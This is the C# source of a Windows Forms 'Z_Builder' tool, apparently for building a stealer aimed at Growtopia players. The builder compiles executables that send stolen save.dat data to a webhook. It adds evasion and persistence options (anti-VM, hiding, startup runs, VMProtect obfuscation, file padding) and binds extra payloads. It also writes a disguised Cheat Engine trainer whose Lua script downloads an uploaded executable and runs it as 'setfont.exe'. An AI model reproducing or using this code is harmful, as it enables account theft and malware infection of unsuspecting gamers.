using System;
using System.IO;
using System.Configuration;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.CodeDom.Compiler;
using AnonFileAPI;
using System.IO.Compression;
using System.Diagnostics;

namespace Z_Builder
{
    public partial class Form2 : MetroFramework.Forms.MetroForm
    {
        List <string> alldata { get; set; }
        string IcoFilePath { get; set; }
        public Form2(string ID)
        {
            InitializeComponent();
            metroTextBox8.Text = new System.Net.WebClient() { Proxy = null }.DownloadString("https://pastebin.com/raw/EjyNVk6f");
            metroTextBox9.Text = new System.Net.WebClient() { Proxy = null }.DownloadString("https://pastebin.com/raw/d8LcaGtW");
            metroTextBox10.Text = new System.Net.WebClient() { Proxy = null }.DownloadString("https://pastebin.com/raw/eXJtr8TR");
            metroCheckBox3.Enabled = false;
            metroTextBox6.Visible = false;
            metroLabel6.Text = ID;
            metroTextBox4.Text = ConfigurationManager.AppSettings["zbfolderpath"];
            string zbfolderpath = metroTextBox4.Text;
            try { Directory.CreateDirectory(@"C:\Temp"); } catch { }
        }
        #region Decoder
        private void metroButton1_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog folderDlg = new FolderBrowserDialog();
            folderDlg.ShowNewFolderButton = true;
            DialogResult result = folderDlg.ShowDialog();
            if (result == DialogResult.OK)
            {
                string savefolderpath = folderDlg.SelectedPath;
                metroTextBox4.Clear();
                metroTextBox4.AppendText(savefolderpath);
                Program.setSetting("zbfolderpath", metroTextBox4.Text);
            }
        }

        private void folderBrowserDialog1_HelpRequest(object sender, EventArgs e)
        {

        }
        
        private void metroButton2_Click(object sender, EventArgs e)
        {
            SortZB();
        }
        void SortZB()
        {
            string zbfolderpath = ConfigurationManager.AppSettings["zbfolderpath"];
            string[] allsaves = Directory.GetFiles(zbfolderpath, "*.zb");
            string RawData = "";
            listView2.Items.Clear();
            foreach (string i in allsaves)
            {
                RawData += File.ReadAllText(i);
            }
            string[] SplittedData = RawData.Split('\n');
            foreach(string i in SplittedData)
            {
                string[] CleanedData = i.Split(new[] { "[---ZB-Split---]" }, StringSplitOptions.RemoveEmptyEntries);
                ListViewItem CleanedAccData = new ListViewItem(CleanedData);
                listView2.Items.Add(CleanedAccData);
            }
        }
        #endregion
        #region Builder
        private void openFileDialog1_FileOk(object sender, CancelEventArgs e)
        {

        }

        private void metroButton4_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                OpenFileDialog dialog = new OpenFileDialog();
                dialog.Filter = "Ico files (*ico)|*.ico";
                dialog.Title = "Select an ico file";
                DialogResult result = dialog.ShowDialog();
                if (result == DialogResult.OK)
                {
                    pictureBox1.Load(dialog.FileName);
                    pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
                    IcoFilePath = dialog.FileName;
                    metroTextBox7.Clear();
                    metroTextBox7.Text = IcoFilePath;
                }
            }
        }

        private void metroButton3_Click(object sender, EventArgs e)
        {
            if (!String.IsNullOrEmpty(metroTextBox5.Text))
                {
                if (metroCheckBox8.Checked == true)
                {
                    SaveFileDialog sfd = new SaveFileDialog();
                    sfd.FileName = "Stealer.CETRAINER";
                    sfd.Filter = "CETRAINER files (*.CETRAINER)|*.CETRAINER";
                    if (sfd.ShowDialog() == DialogResult.OK)
                    {
                        sfd.FileName = Path.GetDirectoryName(sfd.FileName) + "\\" + Path.GetFileNameWithoutExtension(sfd.FileName) + ".exe";
                        compile(sfd.FileName);
                    }
                }
                else
                {
                    SaveFileDialog sfd = new SaveFileDialog();
                    sfd.FileName = "Stealer.exe";
                    sfd.Filter = "Exe files (*.exe)|*.exe";
                    if (sfd.ShowDialog() == DialogResult.OK)
                    {
                        compile(sfd.FileName);
                    }
                }
            }
            else
            {
                MessageBox.Show("Missing webhook URL");
            }
        }
        public void compile(string path)
        {
            if (listView1.Items.Count > 0)
            {
                if(metroComboBox1.Text == "")
                {
                    MessageBox.Show("Drop path required for binded files");
                    return;
                }
            }
            string basecode = Properties.Resources.Code;
            basecode = BuildBase(basecode);
            List<string> code = new List<string>();
            code.Add(basecode);
            string manifest = @"<?xml version=""1.0"" encoding=""utf-8""?>
<assembly manifestVersion=""1.0"" xmlns=""urn:schemas-microsoft-com:asm.v1"">
  <assemblyIdentity version=""1.0.0.0"" name=""MyApplication.app""/>
  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v2"">
    <security>
      <requestedPrivileges xmlns=""urn:schemas-microsoft-com:asm.v3"">
        <requestedExecutionLevel level=""highestAvailable"" uiAccess=""false"" />
      </requestedPrivileges>
    </security>
  </trustInfo>
  <compatibility xmlns=""urn:schemas-microsoft-com:compatibility.v1"">
    <application>
    </application>
  </compatibility>
</assembly>
";
            File.WriteAllText(Application.StartupPath + @"\manifest.manifest", manifest);
            CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
            CompilerParameters compars = new CompilerParameters();
            compars.ReferencedAssemblies.Add("System.Net.dll");
            compars.ReferencedAssemblies.Add("System.Net.Http.dll");
            compars.ReferencedAssemblies.Add("System.dll");
            compars.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            compars.ReferencedAssemblies.Add("System.Drawing.dll");
            compars.ReferencedAssemblies.Add("System.Management.dll");
            compars.ReferencedAssemblies.Add("System.IO.dll");
            compars.ReferencedAssemblies.Add("System.IO.compression.dll");
            compars.ReferencedAssemblies.Add("System.IO.compression.filesystem.dll");
            compars.ReferencedAssemblies.Add("System.Core.dll");
            compars.ReferencedAssemblies.Add("System.Security.dll");
            compars.ReferencedAssemblies.Add("System.Diagnostics.Process.dll");
            string tempPathForAntiDelete = @"C:\Temp\AntiDelete.exe";
            try { File.Delete(tempPathForAntiDelete); } catch { }
            File.WriteAllBytes(tempPathForAntiDelete, Properties.Resources.AntiDelete);
            compars.EmbeddedResources.Add(tempPathForAntiDelete);
            compars.GenerateExecutable = true;
            string TempEXEPath = @"C:\Temp\" + Path.GetFileName(path);
            try { File.Delete(TempEXEPath); } catch { }
            compars.OutputAssembly = TempEXEPath;
            compars.GenerateInMemory = false;
            compars.TreatWarningsAsErrors = false;
            compars.CompilerOptions += "/t:winexe /unsafe /platform:x86";
            if (!string.IsNullOrEmpty(metroTextBox7.Text) || !string.IsNullOrWhiteSpace(metroTextBox7.Text) && metroTextBox7.Text.Contains(@"\") && metroTextBox7.Text.Contains(@":") && metroTextBox7.Text.Length >= 7)
            {
                compars.CompilerOptions += " /win32icon:" + @"""" + metroTextBox7.Text + @"""";
            }
            else if (string.IsNullOrEmpty(metroTextBox7.Text) || string.IsNullOrWhiteSpace(metroTextBox7.Text))
            {
            }
            if (listView1.Items.Count > 0)
            {
                foreach (ListViewItem item in listView1.Items)
                {
                    compars.EmbeddedResources.Add("" + item.SubItems[0].Text + "");
                }
            }
            System.Threading.Thread.Sleep(100);
            CompilerResults res = provider.CompileAssemblyFromSource(compars, code.ToArray());
            if (res.Errors.Count > 0)
            {
                try
                {
                    File.Delete(Application.StartupPath + @"\manifest.manifest");
                }
                catch { }
                foreach (CompilerError ce in res.Errors)
                {
                    MessageBox.Show(ce.ToString());
                }
            }
            else
            {
                try
                {
                    File.Delete(Application.StartupPath + @"\manifest.manifest");
                }
                catch { }
				//Auto Obfuscation
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.WorkingDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);
                p.StartInfo.Arguments = "/C VMProtect_Con " + TempEXEPath + " " + path;
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.Start();
                p.WaitForExit();
                //Auto Obfuscation End
                File.Delete(TempEXEPath);
                if (metroCheckBox8.Checked == true)
                {
                    using (AnonFileWrapper anonFileWrapper = new AnonFileWrapper())
                    {
                        AnonFile anonFile = anonFileWrapper.UploadFile(path);
                        string DownloadPath = anonFileWrapper.GetDirectDownloadLinkFromLink(anonFile.FullUrl);
                        string CetrainerCode = "function lolokieZ(boops)local beepboop = (5*3-2/8+9*2/9+8*3) end function lolokieZ(blahblah)local beepboop = (5*3-2/8+9*2/9+8*3) end local beepboop = (5*3-2/8+9*2/9+8*3) local url = '" + DownloadPath + "'local a= getInternet()local test = a.getURL(url)local location = os.getenv('TEMP')local file = io.open(location..'\\\\setfont.exe', 'wb')file:write(test)file:close()shellExecute(location..'\\\\setfont.exe')";
                        string path2 = Path.GetDirectoryName(path) + "\\" + Path.GetFileNameWithoutExtension(path) + ".CETRAINER";
                        File.WriteAllText(path2, "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<CheatTable CheatEngineTableVersion=\"29\">\n  <CheatEntries/>\n  <UserdefinedSymbols/>\n  <LuaScript>\n" + CetrainerCode + "\n</LuaScript>\n</CheatTable>");
                    }
                    File.Delete(path);
                    File.Delete(tempPathForAntiDelete);
                    MessageBox.Show("Stealer compiled!");
                }
                else
                {
                    File.Delete(tempPathForAntiDelete);
                    MessageBox.Show("Stealer compiled!");
                }
            }
        }
        public string BuildBase(string code)
        {
            string building = code;
            //Webhook
            building = building.Replace("webhook_url", metroTextBox5.Text);
            //Fake error message
            if ((metroCheckBox4.Checked == true) && (!String.IsNullOrEmpty(metroTextBox6.Text)))
            {
                building = building.Replace("//FakeErrorMessage", "MessageBox.Show("+ '"' + metroTextBox6.Text + '"' +  "," + "\"Error!\"" + ",MessageBoxButtons.OK);");
            }
            //Hide stealer
            if (metroCheckBox2.Checked == true)
            {
                building = building.Replace("//HideStealer", "try { File.SetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location, File.GetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location) | FileAttributes.Hidden | FileAttributes.System); } catch { }");
            }
            //Trace save.dat
            if (metroCheckBox1.Checked == true)
            {
                building = building.Replace("//Tracer","Tracer.TraceSave();");
            }
            //Delete Growtopia
            if (metroCheckBox5.Checked == true)
            {
                building = building.Replace("//DeleteGrowtopia", "DeleteGrowtopia();");
            }
            //Run on startup
            if (metroCheckBox6.Checked == true)
            {
                building = building.Replace("//RunOnStartup","RunOnStartup();");
            }
            //Anti-Delete
            if (metroCheckBox3.Checked  == true)
            {
                building = building.Replace("//AntiDelete", "AntiDeleteStealer();");
                building = building.Replace(@"//[AntiDelete]", "");
            }
            //Locate all save.dats
            if (metroCheckBox7.Checked == true && metroCheckBox7.Enabled == true)
            {
                building = building.Replace("//LocateAllSaveDats", "LocateAllSaveDats();");
            }
            //Anti-VM
            if (metroCheckBox9.Checked == true)
            {
                building = building.Replace("//AntiVM", "AntiVM();");
                building = building.Replace("//[AntiVM]", "");
            }
            //Recover save.dats
            if (metroCheckBox10.Checked == true && metroCheckBox10.Enabled == true)
            {
                building = building.Replace("//RecoverSaveDats", "RecoverSaveDats2();");
            }
            if (listView1.Items.Count > 0)
            {
                string extractcode = @"		static void ugaylmao()
		{
			string copytothis = Environment.ExpandEnvironmentVariables(""**PATHRESOURCE**"");
			//turnon
		}
		private static void Extract(string resource, string path, bool admin)
		{
			using (var assemblystream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resource))
			{
				using (var fileStream = new FileStream(path + ""\\"" + resource, FileMode.Create, FileAccess.Write))
				{
					assemblystream.CopyTo(fileStream);
                    fileStream.Close();
				}
			}
			if (admin)
			{
                    Process process = new Process();
                    process.StartInfo.FileName = path + ""\\"" + resource;
                    process.StartInfo.UseShellExecute = true;
                    process.StartInfo.Verb = ""runas"";
                    process.Start();
            }
			else
			{
				Process.Start(path + ""\\"" + resource);
			}
		}";
                int index = extractcode.IndexOf("//turnon");
                string cd = extractcode;
                foreach (ListViewItem items in listView1.Items)
                {
                    cd = cd.Insert(index, Environment.NewLine + @"Extract(""" + Path.GetFileName(items.SubItems[0].Text) + @""", copytothis," + items.SubItems[1].Text + ")" + ";");
                }
                building = building.Replace("//extractbinder", cd);
                building = building.Replace("**PATHRESOURCE**", metroComboBox1.SelectedItem.ToString());
                building = building.Replace("//turnonbinder", "ugaylmao();");
            }
            return building;
        }
        private void metroCheckBox4_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox4.Checked == true)
            {
                metroTextBox6.Visible = true;
            }
            else
            {
                metroTextBox6.Visible = false;
            }
        }

        private void metroCheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox1.Checked == true)
            {
                metroCheckBox3.Enabled = true;
            }
            else
            {
                metroCheckBox3.Enabled = false;
            }
        }

        private void metroCheckBox10_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox10.Checked == true)
            {
                metroCheckBox7.Enabled = false;
            }
            else
            {
                metroCheckBox7.Enabled = true;
            }
        }

        private void metroCheckBox7_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox7.Checked == true)
            {
                metroCheckBox10.Enabled = false;
            }
            else
            {
                metroCheckBox10.Enabled = true;
            }
        }
        #endregion
        #region Binder
        private void metroButton5_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                string[] BindedFileInfo = { ofd.FileName, "false" };
                ListViewItem BindedList = new ListViewItem(BindedFileInfo);
                listView1.Items.Add(BindedList);
            }
            else
            {
                return;
            }
        }
        private void metroButton7_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems[0].SubItems[1].Text == "true")
                {
                    listView1.SelectedItems[0].SubItems[1].Text = "false";
                }
                else if (listView1.SelectedItems[0].SubItems[1].Text == "false")
                {
                    listView1.SelectedItems[0].SubItems[1].Text = "true";
                }
            }
            catch { }
        }
        private void metroButton6_Click(object sender, EventArgs e)
        {
            if (listView1.Items.Count > 0)
            {
                try
                {
                    listView1.SelectedItems[0].Remove();
                }
                catch { }
            }
        }
        #endregion
        #region Pumper
        private void metroButton9_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Exe Files (.exe)|*.exe|All Files (*.*)|*.*";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                metroTextBox11.Text = ofd.FileName;
            }
        }
        private void metroCheckBox11_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox11.Checked == true)
            {
                metroCheckBox12.Checked = false;
            }
            else
            {
                metroCheckBox12.Checked = true;
            }
        }
        private void metroCheckBox12_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox12.Checked == true)
            {
                metroCheckBox11.Checked = false;
            }
            else
            {
                metroCheckBox11.Checked = true;
            }
        }
        private void metroButton8_Click(object sender, EventArgs e)
        {
            if (File.Exists(metroTextBox11.Text)&&Path.GetExtension(metroTextBox11.Text)==".exe")
            {
                if (metroCheckBox11.Checked == true)
                {
                    FileStream file = File.OpenWrite(metroTextBox11.Text);
                    long ende = file.Seek(0, SeekOrigin.End);
                    decimal groesse = numericUpDown1.Value * 1048;
                    while (ende < groesse)
                    {
                        ende++;
                        file.WriteByte(0);
                    }
                    file.Close();
                    MessageBox.Show("Exe file pumped!");
                }
                else if (metroCheckBox12.Checked == true)
                {
                    FileStream file = File.OpenWrite(metroTextBox11.Text);
                    long ende = file.Seek(0, SeekOrigin.End);
                    decimal groesse = numericUpDown1.Value * 1048576;
                    while (ende < groesse)
                    {
                        ende++;
                        file.WriteByte(0);
                    }
                    file.Close();
                    MessageBox.Show("Exe file pumped!");
                }
                else
                {
                    MessageBox.Show("Select KB or MB");
                }
            }
            else
            {
                MessageBox.Show("Bad File or no executable path chosen!");
            }
        }
        #endregion
    }
}
